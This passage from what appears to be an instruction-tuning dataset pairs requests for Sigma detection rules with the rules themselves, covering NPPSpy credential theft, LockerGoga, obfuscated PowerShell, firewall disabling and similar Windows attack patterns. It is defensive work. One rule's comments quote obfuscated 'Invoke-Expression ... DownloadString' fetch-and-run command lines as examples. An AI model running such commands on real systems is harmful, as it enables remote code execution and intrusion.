    "instruction": "Build a Sigma rule with the goal of detecting when an attacker tries to add a new network provider in order to dump clear text credentials, similar to how the NPPSpy tool does it.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when an attacker tries to add a new network provider in order to dump clear text credentials, similar to how the NPPSpy tool does it, you should monitor registry settings particularly focusing on changes within the Windows environment. Keep an eye on the registry set category, specifically targeting instances where the event type is 'SetValue'. This indicates a modification action on the registry.\n\nFocus on modifications targeting objects within the '\\System\\CurrentControlSet\\Services\\' directory that also include '\\NetworkProvider'. These areas are critical because they involve the configuration of network services, where malicious modifications can serve as a mechanism for credential theft.\n\nHowever, it's important to apply certain filters to avoid false positives and focus on potentially malicious activity. Exclude modifications targeting the WebClient, LanmanWorkstation, and RDPNP services under the '\\NetworkProvider' path because changes to these might not necessarily indicate malicious behavior and are sometimes part of legitimate network configurations. These exclusions are essential to narrow down the detection to alterations more closely associated with attack techniques that involve the addition of rogue network providers.\n\nMoreover, take into consideration the process responsible for making the registry changes. Specifically, if the changes come from 'C:\\Windows\\System32\\poqexec.exe', it might not be considered suspicious under certain circumstances. This process, when involved in legitimate operations, can help mitigate false positives, given its potential use in benign system configurations.\n\nThese monitoring and filtering strategies involve working with tags correlated with MITRE ATT&CK tactics and techniques, although specific technique identifiers should be derived from the nature of logged events and the context of observed changes. \n\nBe aware that there can be instances where legitimate software or configurations could trigger these detections. Hence, maintaining an up-to-date filter list and understanding the operational environment are critical to distinguishing between genuine threats and operational noise. This approach ensures heightened vigilance against methods employed for credential theft through unauthorized network provider modifications.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains|all:\n            - '\\System\\CurrentControlSet\\Services\\'\n            - '\\NetworkProvider'\n    filter:\n        TargetObject|contains:\n            - '\\System\\CurrentControlSet\\Services\\WebClient\\NetworkProvider'\n            - '\\System\\CurrentControlSet\\Services\\LanmanWorkstation\\NetworkProvider'\n            - '\\System\\CurrentControlSet\\Services\\RDPNP\\NetworkProvider'\n            #- '\\System\\CurrentControlSet\\Services\\P9NP\\NetworkProvider' # Related to WSL remove the comment if you use WSL in your ENV\n    filter_valid_procs:\n        Image: C:\\Windows\\System32\\poqexec.exe\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - Other legitimate network providers used and not filtred in this rule\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains|all:\n            - '\\System\\CurrentControlSet\\Services\\'\n            - '\\NetworkProvider'\n    filter:\n        TargetObject|contains:\n            - '\\System\\CurrentControlSet\\Services\\WebClient\\NetworkProvider'\n            - '\\System\\CurrentControlSet\\Services\\LanmanWorkstation\\NetworkProvider'\n            - '\\System\\CurrentControlSet\\Services\\RDPNP\\NetworkProvider'\n            #- '\\System\\CurrentControlSet\\Services\\P9NP\\NetworkProvider' # Related to WSL remove the comment if you use WSL in your ENV\n    filter_valid_procs:\n        Image: C:\\Windows\\System32\\poqexec.exe\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - Other legitimate network providers used and not filtred in this rule\nlevel: medium\n",
      "question": "when an attacker tries to add a new network provider in order to dump clear text credentials, similar to how the NPPSpy tool does it",
      "answer": "In order to detect when an attacker tries to add a new network provider in order to dump clear text credentials, similar to how the NPPSpy tool does it, you should monitor registry settings particularly focusing on changes within the Windows environment. Keep an eye on the registry set category, specifically targeting instances where the event type is 'SetValue'. This indicates a modification action on the registry.\n\nFocus on modifications targeting objects within the '\\System\\CurrentControlSet\\Services\\' directory that also include '\\NetworkProvider'. These areas are critical because they involve the configuration of network services, where malicious modifications can serve as a mechanism for credential theft.\n\nHowever, it's important to apply certain filters to avoid false positives and focus on potentially malicious activity. Exclude modifications targeting the WebClient, LanmanWorkstation, and RDPNP services under the '\\NetworkProvider' path because changes to these might not necessarily indicate malicious behavior and are sometimes part of legitimate network configurations. These exclusions are essential to narrow down the detection to alterations more closely associated with attack techniques that involve the addition of rogue network providers.\n\nMoreover, take into consideration the process responsible for making the registry changes. Specifically, if the changes come from 'C:\\Windows\\System32\\poqexec.exe', it might not be considered suspicious under certain circumstances. This process, when involved in legitimate operations, can help mitigate false positives, given its potential use in benign system configurations.\n\nThese monitoring and filtering strategies involve working with tags correlated with MITRE ATT&CK tactics and techniques, although specific technique identifiers should be derived from the nature of logged events and the context of observed changes. \n\nBe aware that there can be instances where legitimate software or configurations could trigger these detections. Hence, maintaining an up-to-date filter list and understanding the operational environment are critical to distinguishing between genuine threats and operational noise. This approach ensures heightened vigilance against methods employed for credential theft through unauthorized network provider modifications."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity, you should monitor process creation events on Windows systems, focusing on the relationships between parent and child processes specifically involving wab.exe and wabmig.exe. Special attention should be given to scenarios where these processes are spawned by or spawn known suspicious executables, such as WmiPrvSE.exe, svchost.exe, or dllhost.exe. Identifying unfamiliar or unexpected parent-child process associations involving these specific executables could be indicative of malicious activities. The detection strategy labels this as exhibiting a high level of threat due to the potential for misuse in bumblebee-related cyber attacks, even though there might be instances where the activity is benign, the occurrence of false positives is acknowledged as unknown.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            # Add more if known\n            - \\WmiPrvSE.exe\n            - \\svchost.exe\n            - \\dllhost.exe\n        Image|endswith:\n            - '\\wab.exe'\n            - '\\wabmig.exe' # (Microsoft Address Book Import Tool)\n    selection_child:\n        # You can add specific suspicious child processes (such as cmd, powershell...) to increase the accuracy\n        ParentImage|endswith:\n            - '\\wab.exe'\n            - '\\wabmig.exe' # (Microsoft Address Book Import Tool)\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            # Add more if known\n            - \\WmiPrvSE.exe\n            - \\svchost.exe\n            - \\dllhost.exe\n        Image|endswith:\n            - '\\wab.exe'\n            - '\\wabmig.exe' # (Microsoft Address Book Import Tool)\n    selection_child:\n        # You can add specific suspicious child processes (such as cmd, powershell...) to increase the accuracy\n        ParentImage|endswith:\n            - '\\wab.exe'\n            - '\\wabmig.exe' # (Microsoft Address Book Import Tool)\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity",
      "answer": "In order to detect unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity, you should monitor process creation events on Windows systems, focusing on the relationships between parent and child processes specifically involving wab.exe and wabmig.exe. Special attention should be given to scenarios where these processes are spawned by or spawn known suspicious executables, such as WmiPrvSE.exe, svchost.exe, or dllhost.exe. Identifying unfamiliar or unexpected parent-child process associations involving these specific executables could be indicative of malicious activities. The detection strategy labels this as exhibiting a high level of threat due to the potential for misuse in bumblebee-related cyber attacks, even though there might be instances where the activity is benign, the occurrence of false positives is acknowledged as unknown."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious LOLBIN AccCheckConsole execution with parameters as used to load an arbitrary DLL.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious LOLBIN AccCheckConsole execution with parameters as used to load an arbitrary DLL, you should: focus on monitoring process creation events within Windows environments. Watch for processes that are initiated with an image name ending in '\\AccCheckConsole.exe' or have an original file name of 'AccCheckConsole.exe'. Moreover, pay close attention to the command line arguments, specifically looking for occurrences where both '-window' and a '.dll' file are mentioned together. This particular behavior indicates an attempt to load an arbitrary DLL, which is a common technique used by adversaries to execute malicious code. Be aware that there can be legitimate uses of the UI Accessibility Checker (AccCheckConsole), so it's essential to differentiate between benign and malicious activity. The associated detection strategy carries a high level of importance due to the potential for abuse in executing unauthorized or malicious code on a system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\AccCheckConsole.exe'\n        - OriginalFileName: 'AccCheckConsole.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -window '\n            - '.dll'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate use of the UI Accessibility Checker\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\AccCheckConsole.exe'\n        - OriginalFileName: 'AccCheckConsole.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -window '\n            - '.dll'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate use of the UI Accessibility Checker\nlevel: high\n",
      "question": "suspicious LOLBIN AccCheckConsole execution with parameters as used to load an arbitrary DLL",
      "answer": "In order to detect suspicious LOLBIN AccCheckConsole execution with parameters as used to load an arbitrary DLL, you should: focus on monitoring process creation events within Windows environments. Watch for processes that are initiated with an image name ending in '\\AccCheckConsole.exe' or have an original file name of 'AccCheckConsole.exe'. Moreover, pay close attention to the command line arguments, specifically looking for occurrences where both '-window' and a '.dll' file are mentioned together. This particular behavior indicates an attempt to load an arbitrary DLL, which is a common technique used by adversaries to execute malicious code. Be aware that there can be legitimate uses of the UI Accessibility Checker (AccCheckConsole), so it's essential to differentiate between benign and malicious activity. The associated detection strategy carries a high level of importance due to the potential for abuse in executing unauthorized or malicious code on a system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting activity when Windows Defender Firewall has been reset to its default configuration.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect activity when Windows Defender Firewall has been reset to its default configuration, you should: Monitor Windows firewall event logs for signs indicating that the Windows Defender Firewall settings have been reverted to their default configurations. This can be identified by looking for events with ID 2032, which signals this reset on versions of Windows prior to Windows 11, and event ID 2060, which indicates the same action but specifically on Windows 11 systems. This monitoring is crucial as resetting firewall configurations can be an indicator of an attacker attempting to weaken the host\u2019s defenses by reverting any custom rules that were added to block malicious activity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: firewall-as\ndetection:\n    selection:\n        EventID:\n            - 2032 # Windows Defender Firewall has been reset to its default configuration\n            - 2060 # Windows Defender Firewall has been reset to its default configuration. (Windows 11)\n    condition: selection\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: firewall-as\ndetection:\n    selection:\n        EventID:\n            - 2032 # Windows Defender Firewall has been reset to its default configuration\n            - 2060 # Windows Defender Firewall has been reset to its default configuration. (Windows 11)\n    condition: selection\nlevel: low\n",
      "question": "activity when Windows Defender Firewall has been reset to its default configuration",
      "answer": "In order to detect activity when Windows Defender Firewall has been reset to its default configuration, you should: Monitor Windows firewall event logs for signs indicating that the Windows Defender Firewall settings have been reverted to their default configurations. This can be identified by looking for events with ID 2032, which signals this reset on versions of Windows prior to Windows 11, and event ID 2060, which indicates the same action but specifically on Windows 11 systems. This monitoring is crucial as resetting firewall configurations can be an indicator of an attacker attempting to weaken the host\u2019s defenses by reverting any custom rules that were added to block malicious activity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Use of the commandline to shutdown or reboot windows.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to use the commandline to shutdown or reboot windows, you should monitor the creation of process events on Windows systems that end with the initiation of 'shutdown.exe'. Specifically look for commands that include the arguments '/r ' which indicates a reboot or '/s ' which signifies a shutdown operation. This approach assists in detecting activities that could be related to unauthorized or malicious attempts to shutdown or reboot a system, which can be a part of disruptive actions against the system's availability. The detection falls under the category of process creation with a medium level of alert due to potential false positives, as there might be legitimate reasons for using these commands in administrative contexts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\shutdown.exe'\n        CommandLine|contains:\n            - '/r '\n            - '/s '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\shutdown.exe'\n        CommandLine|contains:\n            - '/r '\n            - '/s '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Use of the commandline to shutdown or reboot windows",
      "answer": "In order to use the commandline to shutdown or reboot windows, you should monitor the creation of process events on Windows systems that end with the initiation of 'shutdown.exe'. Specifically look for commands that include the arguments '/r ' which indicates a reboot or '/s ' which signifies a shutdown operation. This approach assists in detecting activities that could be related to unauthorized or malicious attempts to shutdown or reboot a system, which can be a part of disruptive actions against the system's availability. The detection falls under the category of process creation with a medium level of alert due to potential false positives, as there might be legitimate reasons for using these commands in administrative contexts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting scenarios where an attacker enables the OpenSSH server and server starts to listening on SSH socket..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect scenarios where an attacker enables the OpenSSH server and server starts to listening on SSH socket, you should: Look for events generated by the OpenSSH service on Windows systems specifically monitoring the logs that come from the service named openssh. Focus particularly on events with an EventID of 4, which signify in this context that the OpenSSH server (sshd) has initiated and is now listening for incoming connections. This is identified by log entries where the payload field begins with the text 'Server listening on '. It's crucial to be aware that there can be legitimate reasons for these events, such as administrator activity setting up the service. These detections are flagged with a medium alert level, indicating a noteworthy but not definitively malicious activity on its own. Recognizing these activities involves understanding their relationship with potential attack methods, specifically those that relate to enabling unauthorized access or command and control capabilities through the SSH protocol.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: openssh\ndetection:\n    selection:\n        EventID: 4\n        process: sshd\n        payload|startswith: 'Server listening on '\n    condition: selection\nfalsepositives:\n    - Legitimate administrator activity\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: openssh\ndetection:\n    selection:\n        EventID: 4\n        process: sshd\n        payload|startswith: 'Server listening on '\n    condition: selection\nfalsepositives:\n    - Legitimate administrator activity\nlevel: medium\n",
      "question": "scenarios where an attacker enables the OpenSSH server and server starts to listening on SSH socket.",
      "answer": "In order to detect scenarios where an attacker enables the OpenSSH server and server starts to listening on SSH socket, you should: Look for events generated by the OpenSSH service on Windows systems specifically monitoring the logs that come from the service named openssh. Focus particularly on events with an EventID of 4, which signify in this context that the OpenSSH server (sshd) has initiated and is now listening for incoming connections. This is identified by log entries where the payload field begins with the text 'Server listening on '. It's crucial to be aware that there can be legitimate reasons for these events, such as administrator activity setting up the service. These detections are flagged with a medium alert level, indicating a noteworthy but not definitively malicious activity on its own. Recognizing these activities involves understanding their relationship with potential attack methods, specifically those that relate to enabling unauthorized access or command and control capabilities through the SSH protocol."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated use of stdin to execute PowerShell.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated use of stdin to execute PowerShell, you should focus on monitoring Windows system service logs, specifically targeting events recorded by the Service Control Manager. Look for event ID 7045, which pertains to service installations. The critical indicator to watch for involves service installation commands that invoke PowerShell via the command line (cmd) using either the '/c' or '/r' switch to carry out commands. These commands are particularly suspicious when they include both 'cmd' and 'powershell' within the service's binary path or ImagePath.\n\nMoreover, signs of obfuscation and potential evasion techniques become apparent when the ImagePath contains specific patterns. These include the presence of 'noexit', which aims to keep the PowerShell session open, and sequences combining 'input' with the '$' character, suggesting the script is attempting to read from stdin in a manner that might not be straightforward. Such combinations are often employed to obscure the command's true nature, making it harder to detect malicious activities.\n\nTo efficiently detect these behaviors, ensure that your detection mechanisms capture all instances where the conditions mentioned above are met simultaneously. However, be aware that there might be rare legitimate uses that trigger these indicators, so consider these as high-level alerts that require manual verification to confirm their malicious intent.\n\nBy focusing on these specific patterns and behaviors in the Windows system service logs, you can identify attempts to execute PowerShell scripts in a manner that seeks to evade detection through obfuscation, which is a common tactic in various attack scenarios such as Initial Access, Execution, and Defense Evasion.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection_main:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        # ImagePath|re: '.*cmd.{0,5}(?:\\/c|\\/r).+powershell.+(?:\\$\\{?input\\}?|noexit).+\\\"'\n        # Example 1: c:\\windows\\sYstEm32\\CmD.eXE /C\"echO\\Invoke-Expression (New-Object Net.WebClient).DownloadString | POwersHELl -NoEXiT -\"\n        # Example 2: c:\\WiNDOws\\sysTEm32\\cmd.EXe /C \" ECHo Invoke-Expression (New-Object Net.WebClient).DownloadString | POwersHELl -nol ${EXEcUtIONCONTeXT}.INvOkEComMANd.InvOKEScRIPt( $InpUt )\"\n        ImagePath|contains|all:\n            - 'cmd'\n            - 'powershell'\n        ImagePath|contains:\n            - '/c'\n            - '/r'\n    selection_other:\n        - ImagePath|contains: 'noexit'\n        - ImagePath|contains|all:\n            - 'input'\n            - '$'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection_main:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        # ImagePath|re: '.*cmd.{0,5}(?:\\/c|\\/r).+powershell.+(?:\\$\\{?input\\}?|noexit).+\\\"'\n        # Example 1: c:\\windows\\sYstEm32\\CmD.eXE /C\"echO\\Invoke-Expression (New-Object Net.WebClient).DownloadString | POwersHELl -NoEXiT -\"\n        # Example 2: c:\\WiNDOws\\sysTEm32\\cmd.EXe /C \" ECHo Invoke-Expression (New-Object Net.WebClient).DownloadString | POwersHELl -nol ${EXEcUtIONCONTeXT}.INvOkEComMANd.InvOKEScRIPt( $InpUt )\"\n        ImagePath|contains|all:\n            - 'cmd'\n            - 'powershell'\n        ImagePath|contains:\n            - '/c'\n            - '/r'\n    selection_other:\n        - ImagePath|contains: 'noexit'\n        - ImagePath|contains|all:\n            - 'input'\n            - '$'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated use of stdin to execute PowerShell",
      "answer": "In order to detect obfuscated use of stdin to execute PowerShell, you should focus on monitoring Windows system service logs, specifically targeting events recorded by the Service Control Manager. Look for event ID 7045, which pertains to service installations. The critical indicator to watch for involves service installation commands that invoke PowerShell via the command line (cmd) using either the '/c' or '/r' switch to carry out commands. These commands are particularly suspicious when they include both 'cmd' and 'powershell' within the service's binary path or ImagePath.\n\nMoreover, signs of obfuscation and potential evasion techniques become apparent when the ImagePath contains specific patterns. These include the presence of 'noexit', which aims to keep the PowerShell session open, and sequences combining 'input' with the '$' character, suggesting the script is attempting to read from stdin in a manner that might not be straightforward. Such combinations are often employed to obscure the command's true nature, making it harder to detect malicious activities.\n\nTo efficiently detect these behaviors, ensure that your detection mechanisms capture all instances where the conditions mentioned above are met simultaneously. However, be aware that there might be rare legitimate uses that trigger these indicators, so consider these as high-level alerts that require manual verification to confirm their malicious intent.\n\nBy focusing on these specific patterns and behaviors in the Windows system service logs, you can identify attempts to execute PowerShell scripts in a manner that seeks to evade detection through obfuscation, which is a common tactic in various attack scenarios such as Initial Access, Execution, and Defense Evasion."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting LockerGoga ransomware activity via specific command line..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect LockerGoga ransomware activity via specific command line, you should: Monitor the creation of processes on Windows systems, focusing specifically on instances where the command line includes the sequence '-i SM-tgytutrc -s'. This specific pattern in the command line is indicative of potential LockerGoga ransomware activity. Since the likelihood of this occurring by chance or through legitimate applications is considered unlikely, any detection of this command line pattern should be treated as critical and investigated promptly. This monitoring strategy is aimed at identifying and responding to techniques associated with ransomware deployment and execution.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '-i SM-tgytutrc -s'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '-i SM-tgytutrc -s'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "LockerGoga ransomware activity via specific command line.",
      "answer": "In order to detect LockerGoga ransomware activity via specific command line, you should: Monitor the creation of processes on Windows systems, focusing specifically on instances where the command line includes the sequence '-i SM-tgytutrc -s'. This specific pattern in the command line is indicative of potential LockerGoga ransomware activity. Since the likelihood of this occurring by chance or through legitimate applications is considered unlikely, any detection of this command line pattern should be treated as critical and investigated promptly. This monitoring strategy is aimed at identifying and responding to techniques associated with ransomware deployment and execution."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting service installed by a client which has PID 0 or whose parent has PID 0.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a service installed by a client which has PID 0 or whose parent has PID 0, you should: Focus on monitoring Windows system logs, specifically targeting events generated by the Service Control Manager. Look for event ID 7045, which signifies a service installation event. Specifically, focus on identifying instances where the 'ProcessId' field reports a value of 0. This is significant because a Process ID (PID) of 0 can indicate that the service was initiated by the system or a process with no parent, potentially signaling a malicious installation. It's important to treat cases that trigger this alert with caution, though some might turn out to be benign, the unknown nature of false positives implies that each instance should be investigated to confirm or rule out malicious activity. This analysis is critical as it relates to identifying potentially malicious service installations, a technique often utilized by adversaries to ensure persistence, execute malware, or obtain privileged access within a compromised system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ProcessId: 0\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ProcessId: 0\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "service installed by a client which has PID 0 or whose parent has PID 0",
      "answer": "In order to detect a service installed by a client which has PID 0 or whose parent has PID 0, you should: Focus on monitoring Windows system logs, specifically targeting events generated by the Service Control Manager. Look for event ID 7045, which signifies a service installation event. Specifically, focus on identifying instances where the 'ProcessId' field reports a value of 0. This is significant because a Process ID (PID) of 0 can indicate that the service was initiated by the system or a process with no parent, potentially signaling a malicious installation. It's important to treat cases that trigger this alert with caution, though some might turn out to be benign, the unknown nature of false positives implies that each instance should be investigated to confirm or rule out malicious activity. This analysis is critical as it relates to identifying potentially malicious service installations, a technique often utilized by adversaries to ensure persistence, execute malware, or obtain privileged access within a compromised system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting When configured with suitable command line arguments, w32tm can act as a delay mechanism.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect mechanisms that could potentially use w32tm as a delay mechanism, you should focus on monitoring process creation events on Windows systems. Look for instances where the process image name ends with \\w32tm.exe, indicating the launch of the Windows Time service executable. Additionally, verify if the OriginalFileName attribute associated with these events is 'w32time.dll', which is a legitimate component of the Windows Time service.\n\nFurther scrutiny is needed for command line arguments accompanying the initiation of these w32tm processes. Specifically, you should look for command lines that contain all the following arguments: '/stripchart', '/computer:', '/period:', '/dataonly', and '/samples:'. These particular arguments suggest a configuration that could be utilized as a delay mechanism, possibly for malicious purposes.\n\nWhile monitoring for these patterns, it's crucial to be aware that there could be legitimate uses of the Windows Time service with these or similar parameters. However, due to the high level of suspicion and potential misuse in a cybersecurity context, any detection of such activity warrants closer inspection.\n\nThis approach aims to flag potential misuse of system tools for purposes like delaying execution or obfuscating malicious activities, aligning with tactics and techniques that involve the execution of commands and scripts for initial access, execution, and persistence.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_w32tm:\n        - Image|endswith: '\\w32tm.exe'\n        - OriginalFileName: 'w32time.dll'\n    selection_cmd:\n        CommandLine|contains|all:\n            - '/stripchart'\n            - '/computer:'\n            - '/period:'\n            - '/dataonly'\n            - '/samples:'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_w32tm:\n        - Image|endswith: '\\w32tm.exe'\n        - OriginalFileName: 'w32time.dll'\n    selection_cmd:\n        CommandLine|contains|all:\n            - '/stripchart'\n            - '/computer:'\n            - '/period:'\n            - '/dataonly'\n            - '/samples:'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: high\n",
      "question": "When configured with suitable command line arguments, w32tm can act as a delay mechanism",
      "answer": "In order to detect mechanisms that could potentially use w32tm as a delay mechanism, you should focus on monitoring process creation events on Windows systems. Look for instances where the process image name ends with \\w32tm.exe, indicating the launch of the Windows Time service executable. Additionally, verify if the OriginalFileName attribute associated with these events is 'w32time.dll', which is a legitimate component of the Windows Time service.\n\nFurther scrutiny is needed for command line arguments accompanying the initiation of these w32tm processes. Specifically, you should look for command lines that contain all the following arguments: '/stripchart', '/computer:', '/period:', '/dataonly', and '/samples:'. These particular arguments suggest a configuration that could be utilized as a delay mechanism, possibly for malicious purposes.\n\nWhile monitoring for these patterns, it's crucial to be aware that there could be legitimate uses of the Windows Time service with these or similar parameters. However, due to the high level of suspicion and potential misuse in a cybersecurity context, any detection of such activity warrants closer inspection.\n\nThis approach aims to flag potential misuse of system tools for purposes like delaying execution or obfuscating malicious activities, aligning with tactics and techniques that involve the execution of commands and scripts for initial access, execution, and persistence."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting user disables the Windows Firewall via a Profile to help evade defense..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a user disables the Windows Firewall via a Profile to help evade defense, you should: Monitor script execution logs on Windows machines, ensuring that Script Block Logging is activated. Specifically, watch for PowerShell script texts that include commands aimed at deactivating the firewall. These include the presence of \"Set-NetFirewallProfile\" along with \"-Enabled\" followed by \"False\", indicating the firewall is being turned off. Additionally, lookout for optional parameters that might specify the scope of this disablement, such as the inclusion of keywords \"-All\", \"Public\", \"Domain\", or \"Private\". This detection mechanism should be always active as there are no known legitimate reasons (false positives) for these actions under normal circumstances, and the risk associated with these activities is considered medium. This monitoring strategy targets potential evasion techniques where attackers attempt to weaken the host's defenses by turning off the firewall.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_args:\n        ScriptBlockText|contains|all:\n            - 'Set-NetFirewallProfile '\n            - ' -Enabled '\n            - ' False'\n    selection_opt:\n        ScriptBlockText|contains:\n            - ' -All '\n            - 'Public'\n            - 'Domain'\n            - 'Private'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_args:\n        ScriptBlockText|contains|all:\n            - 'Set-NetFirewallProfile '\n            - ' -Enabled '\n            - ' False'\n    selection_opt:\n        ScriptBlockText|contains:\n            - ' -All '\n            - 'Public'\n            - 'Domain'\n            - 'Private'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "user disables the Windows Firewall via a Profile to help evade defense.",
      "answer": "In order to detect when a user disables the Windows Firewall via a Profile to help evade defense, you should: Monitor script execution logs on Windows machines, ensuring that Script Block Logging is activated. Specifically, watch for PowerShell script texts that include commands aimed at deactivating the firewall. These include the presence of \"Set-NetFirewallProfile\" along with \"-Enabled\" followed by \"False\", indicating the firewall is being turned off. Additionally, lookout for optional parameters that might specify the scope of this disablement, such as the inclusion of keywords \"-All\", \"Public\", \"Domain\", or \"Private\". This detection mechanism should be always active as there are no known legitimate reasons (false positives) for these actions under normal circumstances, and the risk associated with these activities is considered medium. This monitoring strategy targets potential evasion techniques where attackers attempt to weaken the host's defenses by turning off the firewall."
    }
  },
  {
